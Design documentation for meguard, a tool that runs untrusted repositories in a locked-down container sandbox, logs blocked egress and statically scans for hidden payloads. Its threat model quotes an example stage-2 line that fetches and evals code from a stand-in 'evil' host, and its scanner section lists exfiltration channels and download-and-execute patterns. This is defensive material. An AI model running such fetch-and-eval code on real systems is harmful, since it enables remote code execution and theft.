# meguard documentation

## Overview

meguard executes untrusted repositories inside a locked-down container sandbox,
and statically scans them for signs of hidden malicious code. This document
covers the architecture of the `run` path, each hardening flag and the door it
closes, the threat model, and the scan analyzer architecture (implemented in
`internal/analyze`).

## Architecture

### Packages

- `main.go` - entry point. Builds a signal-aware context (SIGINT/SIGTERM) and
  hands it to the CLI so Ctrl-C cancels in-flight work.
- `cmd/` - cobra wiring. `run` resolves the repo source, builds a Profile,
  runs the two-phase install for node (`cmd/prefetch.go`; see "Two-phase
  install" below), runs the static scan, drives the lifecycle, and prints a
  report; `scan` resolves the repo and runs the same static scan alone, with
  no container. Both default to a compact report and take `-v`/`--verbose`
  for the full one (see "Output verbosity" below). This package DOES import
  `internal/analyze` (it is where detection and containment are combined);
  see "Scan architecture" below.
- `internal/sandbox/` - the sandbox engine: the `Runner` interface, the
  `DockerRunner` CLI implementation, the `Profile` type, the pure `createArgs`
  builder, the `Execute` orchestrator, and the optional `EgressInspector`
  (`egress.go`: monitor argv, sinkhole script, and the pure `parseEgress`
  parser). This package never imports analyze.
- `internal/analyze/` - the scan engine: the `Analyzer` interface, the
  `Report`/`Finding` types, the `Scan` orchestrator (walk once, run every
  analyzer, correlate, dedupe, sort), and the manifest/entropy/regex analyzers
  plus the cgo-gated AST seam. See "Scan architecture" below.

### The Runner interface

`Runner` (in `internal/sandbox/runner.go`) abstracts the container lifecycle:

    Create(ctx, Profile) (id, error)
    CopyInto(ctx, id, srcDir, destPath) error
    Start(ctx, id) error
    Exec(ctx, id, cmd, stdout, stderr) (exitCode, error)
    Remove(ctx, id) error

The only implementation is `DockerRunner`, which shells out to the `docker` CLI
via `os/exec`. Defining the interface now keeps the door open for stronger
backends without touching callers.

There is one OPTIONAL companion interface, `EgressInspector` (in
`internal/sandbox/egress.go`):

    StartMonitor(ctx, Profile) (monitorName, error)
    CollectEgress(ctx, monitorName) ([]EgressEvent, error)

`Execute` type-asserts for it only when `Profile.InspectEgress` is set, so a
`Runner` that does not implement it is unaffected and the default (`--network
none`) path never touches egress code. `DockerRunner` implements it. See
"Egress inspection" below.

The container daemon is a TRUST BOUNDARY: it runs privileged, and meguard trusts
it to enforce the isolation configured at create time. meguard does not trust the
repo code that runs inside.

Upgrade paths, in preference order for a security tool:

1. Docker Go SDK - if parsing CLI output becomes fragile, swap the exec calls
   for the SDK behind the same `Runner` interface.
2. Podman rootless - removes the root-daemon trust boundary.
3. gVisor (runsc) - a user-space kernel, stronger syscall isolation.
4. Firecracker microVMs - the strongest kernel boundary.

### The Profile: zero value is safe

`Profile` (in `internal/sandbox/profile.go`) carries only NON-security choices:
the ecosystem image, the install command, and resource ceilings (memory, CPUs,
PID limit). Every security control is hardcoded in `createArgs` and is not a
field, so:

- The zero-value Profile is the safest Profile.
- A forgotten or zero field cannot open a hole; it can only fall back to a
  locked-down default via `Normalize`.
- Configuration only ever RELAXES ceilings or selects an ecosystem; it can never
  weaken isolation.

`Normalize` fills empty fields with conservative defaults (node:20-slim,
`npm install`, 2g, 2 CPUs, 512 PIDs) and never removes a control.

`InspectEgress` follows the same rule at the library level: its zero value is
`false`, which yields `--network none` (the safest, no-stack mode), so a
forgotten field still cannot open a hole. The `run` CLI, however, defaults
`InspectEgress` to `true` (`--strict` sets it back to `false`) - a deliberate
product choice to make egress visible by default. The distinction matters: the
zero-value Profile is `--network none`; the CLI, not the library, is what opts
into inspection.

### Ecosystem detection

`DetectEcosystem` (in `internal/sandbox/detect.go`) chooses the two RELAX values
(image and install command) from the repo's manifests so the common Node and
Python cases need no flags. Node and Python are the only ecosystems detected for
now; any other (Go, Rust, Ruby, and so on) is unrecognized and falls back to the
node defaults, so it needs an explicit `--image`/`--cmd`. It is an ordered list
of detectors; the first whose marker files exist at the repo root wins:

| Detected | Markers (any) | Image | Install command (single-phase / fast-fail fallback) |
| --- | --- | --- | --- |
| node | `package.json`, `package-lock.json`, `npm-shrinkwrap.json`, `yarn.lock`, `pnpm-lock.yaml` | `node:20-slim` | `npm install --no-audit --no-fund --fetch-retries=0` |
| python | `requirements.txt` | `python:3.12-slim` | `pip install --user --retries 0 --timeout 5 -r requirements.txt` |
| python | `pyproject.toml`, `setup.py`, `setup.cfg`, `Pipfile` | `python:3.12-slim` | `pip install --user --retries 0 --timeout 5 .` |
| python | any top-level `*.py` (no manifest) | `python:3.12-slim` | `python --version` (no-op) |

`--fetch-retries=0` / `--retries 0 --timeout 5` are the fast-fail fix (see
"Two-phase install" below): the sandbox network is always denied, so without
them the install tool retried for minutes before giving up. `Ecosystem` also
carries `PrefetchCmd` and `OfflineInstallCmd` (`internal/sandbox/detect.go`);
node is the only ecosystem with a non-empty `PrefetchCmd` today, and when
`cmd/run.go` uses it, `OfflineInstallCmd` replaces the table's InstallCmd as
the sandbox command instead. See "Two-phase install" below.

Precedence is encoded by detector order: node precedes python (a polyglot repo
is treated as node, the dominant ecosystem among the untrusted take-home repos
meguard targets), and within python `requirements.txt` precedes a project
manifest, which in turn precedes the loose-script fallback. That last fallback
(`hasTopLevelPyFile`) recognizes a repo that is just a bare `.py` file with no
manifest at all, so it lands in the Python image rather than defaulting to node
and running `npm install` against a missing `package.json`. There is nothing to
install in that case, so the install command is a NO-OP (`python --version`)
that never executes repo code (invariant 1 holds and an untrusted script is not
run automatically); the user runs the script explicitly with `--cmd`. When no
detector matches at all, `DetectEcosystem` returns false and the caller falls
back to the locked-down Profile defaults via `Normalize`.

Detection is safe by construction: it only calls `os.Stat` on named top-level
files and `os.ReadDir` on the repo root for the loose-`.py` fallback (never
recursively, never reading file contents) and runs no repo code, so invariant
1 holds - choosing an image is not executing the repo. It only ever supplies the
image and install command, never a security control, so it cannot weaken the
box. The node case reuses `DefaultImage` / `DefaultInstallCmd` so it cannot
drift from the package defaults. pip is given `--user` so its writes go to
`$HOME/.local` on the `/home/sandbox` tmpfs; a plain `pip install` would fail
against the read-only system site-packages.

`cmd/run.go` calls `DetectEcosystem` after resolving the repo and fills only the
fields the user left unset: an explicit `--image` or `--cmd` always wins. The
pre-run notice prints the detected ecosystem (or "unknown (using locked-down
defaults)"). To add an ecosystem, append a detector to the `detectors` slice;
nothing else in the pipeline changes.

### The lifecycle

`Execute` (in `internal/sandbox/execute.go`) runs:

    create <hardened args> <image> sleep infinity
    docker start <id>
    docker exec -i <id> tar -xf - -C /repo   (repo streamed into the tmpfs)
    docker exec <id> <install cmd>           (stdout/stderr streamed live)
    docker rm -f <id>                        (always)

Copy mechanism: meguard does NOT use `docker cp`. Docker refuses `docker cp` into
a --read-only container, so meguard builds a deterministic tar stream in-process
(internal/sandbox/copy.go, `writeRepoTar`) and pipes it to a `tar` process
running inside the container via `docker exec -i`. That extractor writes to the
/repo tmpfs as the sandbox user and is not subject to the read-only rootfs guard.
The repo therefore lives in a container tmpfs with no host bind mount, exactly as
invariant 2 requires. The container is STARTED before the copy because the copy
runs inside it. The image must provide `tar` (standard in Debian and Alpine
bases). The /repo tmpfs is mounted `mode=1777` so the non-root user can write it.

Cleanup guarantee: immediately after a successful create, `Execute` defers a
`Remove` that uses a DETACHED context with its own timeout. Deferred functions
run after any return and during panic unwinding, and the detached context is not
cancelled when the caller's ctx is (Ctrl-C). So `docker rm -f` runs on success,
on install failure, on panic, and on Ctrl-C.

`ExecuteOptions.InstallTimeout` (default `2m` from the CLI's `--timeout` flag,
`0` disables) bounds ONLY the install exec, not create/start/copy. When it
elapses, `Execute` cancels the install's exec context and returns
`sandbox.ErrInstallTimeout`; cleanup still runs via the same deferred detached
`Remove`, so a hung or hostile lifecycle script (which the two-phase offline
install, below, deliberately lets run in-box) cannot stall meguard
indefinitely or leave a container behind. The same `--timeout` value also
bounds the containerized prefetch step (`internal/sandbox/prefetch.go`; see
"Two-phase install" below).

Before any of this, `run` performs a preflight: `DockerRunner.Preflight` runs
`docker info` to confirm a Docker-compatible runtime is reachable. If it is not,
`run` fails fast, before cloning or printing the pre-run notice, with an
actionable error that names OrbStack, Colima, and Podman and states Docker
Desktop is not required. This turns a raw daemon connection error into guidance
and avoids showing protections for a run that cannot start.

The repo source is resolved in `cmd/run.go`:
- A git URL is `git clone --depth 1 -- <source>`ed to a temp dir that is always
  removed. Cloning does not run install hooks, so it is safe on the host. The
  `--` terminates git option parsing so an attacker-controlled source that
  begins with `-` can never be smuggled in as a git flag (defense in depth on
  top of the `isGitURL` gate). `--depth 1` also avoids submodule recursion.
- A local path is used in place (its contents are copied into the container, not
  bind mounted).

`resolveRepo` also returns an `owned` bool: true for a git-clone temp dir meguard
created and may freely mutate, false for the user's own local path used in
place. The two-phase prefetch below copies the populated cache dir back into
the staging dir once the containerized prefetch completes, so an unowned repo
is staged into a fresh temp copy first (`stageForMutation` in
`cmd/prefetch.go`) so meguard never writes into the user's working tree. A git
clone is already an owned temp copy and is used as-is.

### Two-phase install (node) and install timeout

Motivation: an install that never completes both stalls meguard (the sandbox
network is by design always denied, so a naive install retries DNS for
minutes before failing) and, because it never completes, never runs
dependency lifecycle scripts, so their egress is never observed either. Two
fixes plus a redesign, all in `internal/sandbox/detect.go`,
`internal/sandbox/prefetch.go`, `internal/sandbox/args.go`, and
`cmd/prefetch.go`:

**Fast-fail.** The node single-phase install command carries
`--fetch-retries=0`; the python commands carry `--retries 0 --timeout 5`.
Both make the always-denied sandbox network fail in seconds instead of
minutes.

**Install timeout.** `ExecuteOptions.InstallTimeout` (see "The lifecycle"
above) and the matching timeout on the prefetch container's exec
(`PrefetchOptions.Timeout` in `internal/sandbox/prefetch.go`) bound the
in-sandbox install and the containerized prefetch respectively, both driven
by the CLI's `--timeout` flag (default `2m`, `0` disables).
`sandbox.ErrInstallTimeout` is returned on either timeout; cleanup still runs
either way.

**Two-phase install, node only, default on.** `Ecosystem.PrefetchCmd` and
`Ecosystem.OfflineInstallCmd` (`internal/sandbox/detect.go`) implement it:

1. CONTAINER prefetch (`DockerRunner.RunPrefetch` in
   `internal/sandbox/prefetch.go`, invoked from `runPrefetch` in
   `cmd/prefetch.go`): runs `npm install --ignore-scripts --no-audit --no-fund
   --registry=https://registry.npmjs.org/ --cache <in-container path>` inside
   its OWN hardened, throwaway container, never on the host. The container's
   argv is built by `prefetchCreateArgs` (`internal/sandbox/args.go`), which
   shares `baseHardeningArgs` with the sealed sandbox's `createArgs` - same
   non-root user, dropped capabilities, `no-new-privileges`, read-only root,
   tmpfs-only writable paths, and resource ceilings - and differs ONLY in the
   network flag: `--network bridge` instead of `--network none`, because
   prefetch has to reach the registry. This is the one container meguard
   gives a network, and it is safe for two independent reasons: (a)
   `--ignore-scripts` suppresses every lifecycle script of the root package
   and every dependency, so no repo or dependency code ever runs, and
   therefore that network is never reachable to untrusted code (npm itself
   only fetches inert package tarballs into a cache, executed later only
   inside the sealed sandbox); (b) the container has NO host bind mounts
   (same as every meguard container; invariant 2), so a hostile local
   dependency spec (`file:`, a bare path, `overrides`, a workspace glob, a
   lockfile entry, ...) resolves against the CONTAINER's own filesystem, not
   the host's - the host-arbitrary-file-read class is structurally
   impossible here, not something meguard has to detect and block with
   string matching. `RunPrefetch`'s lifecycle mirrors `Execute`'s: create
   (hardened + bridge) -> start -> copy the repo in (`CopyInto`, the same
   tar-through-exec mechanism as the sealed sandbox) -> exec the prefetch
   command -> copy the cache out -> `rm -f` (always, via a deferred detached
   `removeDetached`). Only the populated npm cache (and any generated
   lockfile) is copied back out (`copyCacheOut`); `node_modules` is never
   copied out. `copyCacheOut` streams a `tar` process run inside the
   container (via `docker exec`) into `untarInto`, an in-process extractor
   that validates every entry path stays within the destination - the SAME
   reason `CopyInto` cannot use `docker cp` to copy the repo in: `/repo` is a
   tmpfs mount, and `docker cp` cannot read from a tmpfs or volume mount, only
   the container's layered rootfs. The cache lives at `sandbox.CacheDirName`
   (`.meguard-cache`) inside the staged repo dir on the host once copied out,
   so it travels into the SEALED sandbox with the normal tar-in copy
   (`sandbox.ContainerCacheDir`, `/repo/.meguard-cache`) with no extra mount.
2. SANDBOX install: `cmd/run.go` swaps `profile.InstallCmd` for
   `eco.OfflineInstallCmd` (`npm install --offline --no-audit --no-fund
   --cache /repo/.meguard-cache`). The network is still fully sealed (same
   `--network none` / monitor-netns mechanism as any other run; nothing about
   containment changes) but the full dependency tree is already on disk, so
   every lifecycle script - root and every transitive dependency - actually
   executes inside the box, where its egress is logged and dropped. This is
   the point of the redesign: it is what lets meguard observe a transitive
   dependency's `postinstall` phoning a non-registry host, which the
   single-phase, network-less fallback never even attempts because dependency
   scripts never run without the packages being present.

`willPrefetch` in `cmd/run.go` gates the two-phase path: only when the
ecosystem defines `PrefetchCmd` (node today), `--no-prefetch` was not passed,
and the user did not set `--cmd` explicitly (an explicit `--cmd` always wins
and disables prefetch). Prefetch is best-effort end to end
(`prefetchOutcome`): a staging failure, a failed prefetch container (create,
start, copy-in, the `npm install --ignore-scripts` exec itself, or
copy-cache-out), or a timeout all fall back to the ecosystem's single-phase
`InstallCmd` with a stated reason, never a hard failure of the run.
`printCompactPrefetchLine` renders the outcome as the compact report's
`prefetch` status line.

A repo passed as a local path is staged into a fresh temp copy before
prefetch runs (`stageForMutation` in `cmd/prefetch.go`; prefetch's populated
cache is copied back into that staging dir), so meguard never writes into
the user's working tree. A git clone is already an owned temp copy and is
used as-is.

**Python stays intentionally single-phase**: `pythonEcosystem` sets no
`PrefetchCmd`. Unlike npm's `--ignore-scripts`, there is no pip fetch that
provably runs no repo code: `pip download`/`pip wheel` execute a source
distribution's `setup.py` to resolve metadata, which would be code execution
outside the sealed sandbox. Python gets the fast-fail and timeout fixes
above, but not offline two-phase completion; a contained Python prefetch is
future work (see docs/decisions.md).

### Runtime selection (`--runtime`)

`--runtime` chooses the Docker-compatible CLI that enforces the sandbox (default
`docker`); it maps directly to `DockerRunner.Binary`. Any compatible CLI works
(`podman`, `nerdctl`, ...). Because the daemon is the trust boundary (see the
threat model), a rootless runtime such as `--runtime podman` is preferred for
hostile code: a container escape then lands as an unprivileged user instead of
host root. The pre-run notice prints the chosen runtime and labels it the trust
boundary.

### Egress inspection (default; `--strict` opts out)

Egress is always denied. `--strict` gives `--network none`: no network stack at
all, so a blocked connection attempt leaves no trace to report. The DEFAULT is
the OBSERVABLE posture (still no egress): a monitor sidecar whose network
namespace the sandbox joins. It is implemented as follows, and if the monitor
cannot start the CLI falls back to `--network none` (see the fallback note at the
end of this section):

1. `StartMonitor` creates a hardened monitor container (`--cap-drop ALL` then
   only `--cap-add NET_ADMIN` `--cap-add NET_RAW`, `no-new-privileges`,
   `--read-only`, resource caps). It runs NO repo code.
2. The monitor's shell (`monitorScript`) seals its netns FAIL-CLOSED. It brings
   up a dummy `sink0` interface and points the default route at it so a
   `connect()` to an external address still produces a packet that reaches the
   OUTPUT chain (instead of failing with ENETUNREACH and logging nothing). It
   forces all DNS (any destination, including Docker's embedded `127.0.0.11`) to
   the sinkhole via `iptables -t nat ... DNAT`. Then, in the filter table, it
   accepts loopback, logs everything else via `NFLOG`, and sets the OUTPUT
   policy to DROP - for IPv4 and, when an IPv6 stack is present, IPv6. The DROP
   POLICY (not an interface-specific rule) is what enforces no-egress, so
   containment does not depend on the uplink being named `eth0` or on any single
   route the script removed. Every setup command runs WITHOUT `|| true`, so under
   `set -e` any failure aborts the script before the readiness marker; the script
   also explicitly verifies the DROP policy and NFLOG rule applied before echoing
   the marker. It then execs `tcpdump -i nflog:<group> -n -l`, which captures IN
   the OUTPUT chain (before the drop), independent of egress interface.
3. `Execute` waits for the readiness marker (`waitForMonitorReady`) BEFORE
   creating the sandbox. If it never arrives, or if the monitor process EXITS
   before printing it (a fail-closed abort, detected via `containerExited` so it
   is reported immediately rather than waited out), the monitor is removed and
   the run fails: the sandbox is never created, so it can never join an unsealed
   netns. Capture (tcpdump) runs only after the seal is verified, so losing
   capture loses logs, never containment.
4. The sandbox is created with `--network container:<monitor>` (the ONE
   conditional flag in `createArgs`, via `networkArgs`) and every other
   hardening flag unchanged. It joins the netns but gains NO capability; the
   kernel enforces the sinkhole rules and the unprivileged sandbox cannot alter
   them.
5. After the install, `CollectEgress` reads the monitor's captured output
   (`docker logs`), and the pure `parseEgress` parser turns tcpdump lines into a
   deduplicated, ordered `[]EgressEvent` (`tcp <ip:port>` or `dns <name>`).
   Reading the monitor is best-effort: a failure to read is reported but does
   NOT fail the run, because containment does not depend on the report.
6. BOTH containers are force-removed. `Execute` defers a detached-context
   `Remove` for the monitor and one for the sandbox; LIFO ordering removes the
   sandbox (which shares the netns) before the monitor (invariant 5, extended to
   the pair).

Reporting is explicit: a clean inspected run states "0 outbound attempts", never
silence; an unreadable monitor says so and never claims zero. The monitor image
is `nicolaka/netshoot` by default and overridable with `--monitor-image`; it must
provide `ip` (iproute2), `iptables`, and `tcpdump`.

LIVE-VERIFICATION: the Go orchestration, argv, output, `parseEgress`, and the
fail-closed ordering are unit tested, and the in-container netns/iptables/NFLOG
seal has been verified on Docker/OrbStack (a real Linux kernel). The passing
checklist: a hardcoded-IP SYN is logged (`BLOCKED tcp <ip>:<port>`) and the fetch
times out; a connection to a sibling container on the docker bridge subnet does
NOT leak (proving the OUTPUT DROP policy seals on-link routes, not just the
default route); DNS is captured by name (`BLOCKED dns <name>`); IPv6 is blocked;
a no-call run reports "0 outbound attempts"; the monitor-unavailable path falls
back to `--network none`; and no containers leak. Not yet checked: rootless
runtimes (Podman) and non-`nfnetlink_log` kernels - on those the monitor fails to
start and the CLI falls back to `--network none`. The library zero-value Profile
still selects `--network none`; `--strict` selects the no-stack mode directly.

One timing detail from that verification: Execute waits `monitorFlushDelay`
(~1.2s) after the install command exits before reading the monitor log, so a
single fast packet (e.g. one DNS query from an install that exits immediately)
does not race tcpdump's line-buffered flush and get missed.

Fallback: because inspected mode is experimental and needs a monitor image plus
NFLOG, `Execute` wraps any monitor-start failure in `ErrMonitorUnavailable`. In
the default (non-strict) mode the CLI catches that, prints a warning, and re-runs
with `--network none`. This never weakens containment (no-stack is stronger than
inspected) - it only loses the egress logs for that run, and the fallback is
printed, never silent. `--strict` never inspects, so it has nothing to fall back
from.

## Hardening flags and the door each closes

From `internal/sandbox/args.go`, all unconditional except the network flag noted
below:

| Flag | Door it closes |
| --- | --- |
| `--user 1000:1000` | Never run as root inside the container. |
| `--cap-drop ALL` | Drop every Linux capability. |
| `--security-opt no-new-privileges` | Block setuid/privilege escalation. |
| `--read-only` | Root filesystem is immutable. |
| `--tmpfs /repo:exec,mode=1777` | Repo lives in ephemeral RAM; execution allowed; writable by the non-root user. |
| `--tmpfs /home/sandbox` | Scratch HOME in RAM; holds no host secrets. |
| `--tmpfs /tmp` | Writable scratch in RAM only. |
| `--pids-limit 512` | Cap fork bombs. |
| `--memory 2g` | Cap memory (conservative; will be configurable). |
| `--cpus 2` | Cap CPU (conservative; will be configurable). |
| `--network none` | No egress at all; kills stage-2 payload fetches. This is the ONLY conditional flag: it is used with `--strict`; the DEFAULT (inspected) mode instead uses `--network container:<monitor>` (join the monitor's sealed, no-route netns), which is still no egress but observable. See "Egress inspection". |
| `-w /repo` | Work in the copied repo. |
| `-e HOME=/home/sandbox` | HOME points at scratch tmpfs, not host home. |

## Threat model

Adversary: a repository that looks like a normal take-home or interview project
but contains a payload intended to steal host secrets (SSH keys, cloud creds,
crypto wallets, browser data) or install a RAT. Typical delivery is an npm
`postinstall` hook or an obfuscated blob evaluated at install time.

What meguard denies:

- Host code execution: repo code only runs inside the container, never on the
  host. meguard only clones/copies on the host.
- Host filesystem access: no bind mounts of the repo or `$HOME`; the repo is
  copied into a container tmpfs. There are no host secrets in the container to
  read.
- Egress: a stage-2 fetch (for example
  `axios.get('https://evil/stage2').then(r => eval(r.data))`) cannot connect, and
  any stolen data cannot be exfiltrated. In the DEFAULT inspected mode egress is
  denied by a fail-closed OUTPUT DROP seal AND each blocked attempt (including
  connections to hardcoded IPs) is logged and reported, so you can SEE what the
  repo tried to reach. With `--strict` egress is denied by absence
  (`--network none`, no stack) with no logs. For node, the default two-phase
  install (see "Two-phase install" above) is what makes a TRANSITIVE
  dependency's `postinstall` payload observable at all: it installs offline
  inside the sealed sandbox so that script actually runs in-box, where its
  egress is logged and dropped, instead of never running because a
  network-less single-phase install never gets far enough to reach it.
- Persistence and escalation: read-only root, tmpfs-only writes, dropped caps,
  no-new-privileges, non-root user, and force-removal on exit leave nothing
  behind and nothing to escalate through.

Out of current scope: kernel escapes from the container runtime and escapes
through a rootful daemon (both reduced, not eliminated, by choosing a rootless
runtime with `--runtime podman`, and further by the documented gVisor/Firecracker
upgrade paths). The single largest residual risk is that the
sandbox is only as strong as the runtime enforcing it on a shared host kernel:
meguard raises the bar with cap-drop, no-new-privileges, read-only root,
non-root user, and no network, but a kernel or root-daemon 0-day still reaches
the host. Prefer a rootless runtime for genuinely hostile code. The `run`
guarantee is independent of scan: scan is a read-only, host-side, advisory
detector layered on top of containment, not a replacement for it. A bug in
scan can never weaken the sandbox (`internal/sandbox` never imports
`analyze`), and a scan failure never blocks the sandboxed run.

## Scan architecture (implemented; see `internal/analyze`)

meguard is a container AND a detector: `meguard run` combines the sandbox with
a static scan (advisory by default), and `meguard scan` runs the same
detection alone, with no container and no Docker dependency at all.

### The Analyzer interface and Scan orchestrator

`Analyzer` (in `internal/analyze/analyze.go`) is a single interface:

    Name() string
    Analyze(files []ScannedFile) ([]Finding, error)

`Scan(repoDir string) (Report, error)` walks the repo ONCE
(`internal/analyze/walk.go`, `walkFiles`), reading only file bytes (never
executing anything, matching the trust tier of `sandbox.DetectEcosystem`),
then runs every analyzer against the shared `[]ScannedFile` result, then a
correlation pass, dedupe, and a deterministic sort (severity, then file, then
line).

The walk never descends into version-control metadata, third-party dependency
trees, or inert tool caches (`skipDirNames` in `walk.go`): `.git`,
`node_modules`, `vendor`, `.next`, and the Python set `__pycache__`, `venv`,
`.venv`, `env`, `.tox`, `.eggs`, `.mypy_cache`, `.pytest_cache`, plus glob-named
packaging metadata dirs (`*.egg-info`/`*.dist-info`, via
`isGeneratedMetadataDir`), plus meguard's own two-phase prefetch cache
(`.meguard-cache`, `sandbox.CacheDirName`, duplicated as a literal rather than
imported so `internal/analyze` stays free of any dependency on
`internal/sandbox`): when `run` prefetches (see "Two-phase install" above),
that directory lives inside the staged repo the scan walks and holds npm's
compressed package blobs, which are inert here and would otherwise only add
noise and entropy false positives. The dependency trees CAN carry a malicious payload,
but so can `node_modules`, which has always been skipped: this is a consistent,
deliberate tradeoff, not a hole. Containment (the sandboxed run), not the
advisory scan, is the safety net for whatever a dependency ships, and these
trees are normally gitignored and created at install time inside the container,
not committed. `dist/` and `build/` are DELIBERATELY still walked (an attacker
could disguise a payload as a build artifact); only the generic entropy/long-
line check skips those, and only for that one heuristic.

`Finding` carries an `Analyzer` name, a `Category` (used by the correlation
pass), a `Severity` (Info/Low/Medium/High/Critical), the file and line, a
message, a bounded snippet, and a dedupe `Count`. `Report` carries the
findings, `FilesScanned`, `ASTEnabled`/`ASTDisabledReason` (see below), and
non-fatal `Errors` (skipped files or a failed analyzer; `Scan` still returns a
usable report when these are present).

### The analyzers

- `manifest.go`: flags `package.json` lifecycle scripts (`preinstall`,
  `install`, `postinstall`, `prepare`, `preprepare`), scanning their script
  string with the same pattern set used on source files. Python manifests
  (`setup.py`, `pyproject.toml`, `setup.cfg`, `Pipfile`) are flagged at Info,
  since arbitrary code can run at install time for that ecosystem regardless
  of content.
- `entropy.go`: computes per-line length and Shannon entropy for lines over
  300 characters (`longLineThreshold`). This generalizes "a huge obfuscated
  payload appended after legitimate code on the same physical line" (see
  decision 0016 in docs/decisions.md) to any text file, without hardcoding a
  filename. Excludes `dist/`, `build/`, `*.min.js`, `*.bundle.js` paths, since
  checked-in minified bundles are normal on their own, and a `.svg` file that
  carries no `<script>` tag (see "False-positive controls" below).
- `regex.go`: cheap first-pass pattern matching across categories:
  obfuscation (packer signature, `Function`-constructor eval,
  `global`/`globalThis` require-stashing, the `_0xNNNN` obfuscator-tool
  fingerprint), download-and-execute (curl/wget piped to a shell, Python shell
  exec, Windows LOLBins scoped to `.ps1`/`.bat`/`.cmd`/`.vbs`), exfiltration
  channels (Discord webhooks, Telegram bot API, raw-paste hosts),
  credential/wallet file paths, persistence mechanisms, recon/fingerprinting,
  and bulk `process.env` dumps. Two whole-file co-occurrence checks cover
  plain-text exfiltration (not just obfuscated payloads): a network call plus
  a secrets marker anywhere in one file, and a network call inside a
  build/lint/tooling config file that has no legitimate reason to make one.

### The AST analyzer: a labeled no-op behind cgo build tags

The AST analyzer (tree-sitter) is the ONLY analyzer that needs cgo. It is
isolated behind build tags (`internal/analyze/ast.go`, `ast_cgo.go`,
`ast_nocgo.go`) so it is the sole cgo dependency and degrades to a labeled
no-op when compiled out:

    //go:build cgo      -> astDisabledReason: "not yet implemented for this build (grammar not wired)"
    //go:build !cgo     -> astDisabledReason: "needs a cgo build"

Both variants currently return a `noopAnalyzer`: wiring a real tree-sitter
grammar is future work, out of scope for this slice. `Report.ASTEnabled` is
always `false` today; `Report.ASTDisabledReason` is always set when it is
false, so the absence is stated, never silent - a clean scan is NEVER
presented as "AST found nothing".

### False-positive controls

Designed in alongside detection, not bolted on after:

- Severity is capped by whether a file can actually execute: prose
  (`.md`/`.mdx`/`.txt`/`.rst`/`.adoc`) is capped at Info, since a string
  appearing in documentation is evidence of nothing (this repo's own
  CLAUDE.md and docs/decisions.md discuss an example payload as prose, and
  scan must not treat its own docs as a threat).
- A correlation pass (`correlate` in `analyze.go`) escalates two or more
  distinct WEAK categories co-located in one file (for example a
  credential-path marker plus recon) into one additional High finding, so
  individually common signals only matter combined. It only considers files
  whose capped severity already rose above Info, which naturally excludes
  prose files.
- Dedupe (`dedupeFindings`) collapses repeats of the same (analyzer, category,
  message, file) into one finding with an occurrence count, so one large or
  repetitive file cannot flood the report.
- `entropy.go` excludes `.svg` files (`isSVGPath` in `walk.go`, alongside the
  existing `isMinifiedOrVendorPath`), but ONLY when the file has no `<script>`
  tag (`svgScriptTagRe` in `entropy.go`): SVG `path`/`viewBox` attributes are
  legitimately one long line of numeric coordinate data, which reads as long
  and moderately-high-entropy without being an obfuscated payload, but an SVG
  carrying a `<script>` tag is executable, not static graphics, so it loses
  the exclusion for the whole file (a script-carrying SVG is unusual enough
  on its own to warrant scrutinizing its other long lines too). Either way
  the exclusion is entropy-only and does NOT treat SVG as inert: `.svg` is
  deliberately absent from `proseExtensions`, so `regex.go`'s signature
  checks (script tags, eval, obfuscator fingerprints, exfil URLs, etc.) keep
  scanning ALL `.svg` content unfiltered and at full severity regardless,
  since SVG can also execute via `onload=`/`onclick=` handlers, not just
  `<script>` - a real XSS vector.

### Two build variants, same commands

Two build variants ship: pure static (`CGO_ENABLED=0`, no AST) and cgo
(`CGO_ENABLED=1 -tags cgo`, full). Same binary name and commands. Today no
package in the repo actually imports `"C"`, so the cgo variant's AST analyzer
is a no-op identical in behavior to the pure build's, only the disabled-reason
string differs (see above); the two variants diverge once a real tree-sitter
grammar is wired in.

### How `run` and `scan` wire it in

`cmd/scan.go` (`meguard scan <repo>`) resolves the repo the same safe way
`run` does (`resolveRepo`: git clone only, no execution), calls
`analyze.Scan(repoDir)`, prints a report (compact by default, the full STATIC
SCAN section under `-v`/`--verbose`; see "Output verbosity" below), and exits
non-zero if any High/Critical finding was reported. It touches no
Docker/container code at all.

`cmd/run.go` calls `analyze.Scan` on the resolved repo dir on the HOST,
read-only, before any container work (same trust tier as
`sandbox.DetectEcosystem`), and folds the findings into the same report
(compact by default; the full STATIC SCAN section, between the pre-run
notice and the SANDBOX OUTPUT section, under `-v`). Findings are ADVISORY: the
sandboxed run proceeds regardless of what scan found (containment, not scan,
is the safety net), unless `--fail-on-scan` is set, which exits non-zero
after the run completes if any High/Critical finding was reported. `--no-scan`
skips scanning entirely, restoring the pre-scan behavior exactly. If
`analyze.Scan` itself errors (for example an unreadable repo dir), `run` logs
the failure to stderr and continues with the sandboxed run rather than
blocking it.

### Structural purity

`internal/sandbox` NEVER imports `analyze` or any analyzer package. This is
enforced by `TestSandboxDoesNotImportAnalyze` (in
`internal/sandbox/import_guard_test.go`), which parses `go list -deps` output and
fails if any forbidden import path appears in the sandbox package's transitive
dependencies. The failure direction: the test passes today and fails the moment
sandbox gains such a dependency.

`cmd` (the CLI layer `run` and `scan` live in) DOES import `analyze`, by
design: that is how detection and containment are combined in one command.
What must stay independent is the sandbox's containment guarantee (a bug in
scan must never be able to weaken it), not the CLI layer above it.

### Output verbosity

Both `run` and `scan` default to a COMPACT report: a per-stage status
checklist (`✓`/`!`/`✗` glyphs), only the High/Critical findings listed
individually in a "Top findings" block (capped at `maxTopFindings` = 8, with
everything else rolled into one "... N more" line grouped by analyzer, plus a
"mostly `<dir>`/*" hint when one directory accounts for most of the rest), and
a single free-text `RESULT: ...` sentence. `run` no longer echoes the invoked
`meguard run <source>` command as a header line (it is redundant with what the
user typed); `scan`'s only header is the fixed `meguard scan (no container;
read-only)` mode line. The raw install log (`run` only) is captured but not
printed unless the install exited non-zero, in which case it is dumped under
an `INSTALL LOG (install exited non-zero)` section.

While the slow, otherwise-silent stages run (the static scan, and, for `run`,
the in-container install) a spinner animates a single in-place line on stderr
so the compact path never looks frozen (`cmd/spinner.go`). It is a no-op when
stderr is not a terminal (character-device detection via `os.File.Stat`, so
the run binary stays cgo-free with no external terminal dependency), keeping
piped/redirected output clean, and it is not allocated in `-v`/`--verbose`
mode, which streams its own live output. Frames are plain ASCII by house rule.

`-v`/`--verbose` (both commands) restores the exact previous, full-detail
report: the `meguard: preparing locked-down sandbox` header with the full
active-protections prose (`run` only), every finding listed individually with
its snippet under `STATIC SCAN`, and the streamed `SANDBOX OUTPUT` section
(`run` only) followed by the full `RESULT` section.

This is presentation only: detection, containment, exit codes,
